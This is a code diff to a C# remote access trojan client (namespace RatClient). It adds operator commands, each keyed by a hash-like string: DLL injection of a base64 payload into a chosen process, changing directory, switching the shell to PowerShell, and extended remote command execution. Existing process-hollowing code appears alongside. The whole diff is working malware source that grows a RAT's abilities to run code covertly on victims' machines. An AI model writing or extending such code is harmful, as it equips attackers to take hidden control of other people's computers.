@@ -87,9 +87,30 @@ namespace RatClient
                     xmlDoc.SelectSingleNode("/root/exeonbase").InnerText);
                 return Tools.ProcessHollowing(exePath, exePayload) ? new byte[1] { 48 } : new byte[1] { 49 };
 			}
+            else if (command == "70d78a787fc59a5deb9578a58102ae2d")
+            {
+                int pid = int.Parse(xmlDoc.SelectSingleNode("/root/targetPid").InnerText);
+                byte[] payload = Convert.FromBase64String(xmlDoc.SelectSingleNode("/root/dllonbase").InnerText);
+                return Tools.DllInjection(pid, payload) ? new byte[1] { 48 } : new byte[1] { 49 };
+            }
+            else if(command == "3f1ba9eb608addfb46dac5b51f4a6d87")
+            {
+                string path = xmlDoc.SelectSingleNode("/root/path").InnerText;
+                Directory.SetCurrentDirectory(path);
+                return Encoding.UTF8.GetBytes($"{Directory.GetCurrentDirectory()}>");
+			}
+            else if(command == "adfd9a3aa5bc568d540db256a3782c04")
+            {
+                return Tools.SwitchShell("powershell.exe");
+			}
             else
             {
-                return Tools.RunCommand(command);
+                bool addCd = !string.IsNullOrEmpty(xmlDoc.SelectSingleNode("/root/getcd").InnerText);
+                if (addCd)
+                {
+                    Console.WriteLine("Adding cd");
+                }
+                return  Tools.RunCommand(command, addCd: addCd);
             }
         } 
     }
